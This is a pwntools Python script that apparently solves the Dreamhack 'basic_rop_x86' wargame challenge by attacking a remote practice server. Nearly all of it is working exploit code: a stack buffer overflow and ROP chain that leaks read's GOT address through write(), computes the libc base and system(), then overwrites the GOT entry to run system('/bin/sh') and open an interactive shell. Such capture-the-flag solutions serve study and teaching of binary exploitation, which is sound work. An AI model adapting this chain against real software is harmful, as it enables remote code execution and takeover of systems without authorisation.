from pwn import *


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connection
HOST = 'host3.dreamhack.games'
PORT = 9592
p = remote(HOST, PORT)
# p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

# Set Context
context.arch = 'i386'
context.endian = 'little'
# context.log_level = 'debug'

# gdb.attach(p)

# Exploit
read_plt = e.plt['read']
write_plt = e.plt['write']
read_got = e.got['read']
main = e.symbols['main']
popret = 0x080483d9
pop3ret = 0x08048689

buf = b'A' * 0x40 # buf
payload = buf + b'B' * 0x08 # buf + dummy + sfp

# Exploit
slog('read got', read_got)

## write(1, read_got, 4)
payload += p32(write_plt)
payload += p32(pop3ret)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)
payload += p32(main)

p.send(payload)
p.recvuntil(buf)
read = u32(p.recv(4))
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
slog('read', read)
slog('libc_base', libc_base)
slog('system', system)

# Return to main
payload = buf + b'A' * 0x08 # buf + dummy + sfp

## read(0, read_got, 0x10)
payload += p32(read_plt)
payload += p32(pop3ret)
payload += p32(0)
payload += p32(read_got)
payload += p32(0x10)

## read('/bin/sh') == system('/bin/sh')
payload += p32(read_plt)
payload += p32(popret)
payload += p32(read_got + 0x04)

p.send(payload)
p.recvuntil(buf)
p.send(p32(system) + b'/bin/sh\x00')

p.interactive()


'''

|      buf      |  <- 0x40
|     dummy     |  <- 0x04
|      sfp      |  <- 0x04
|      ret      |  <- 0x04


'''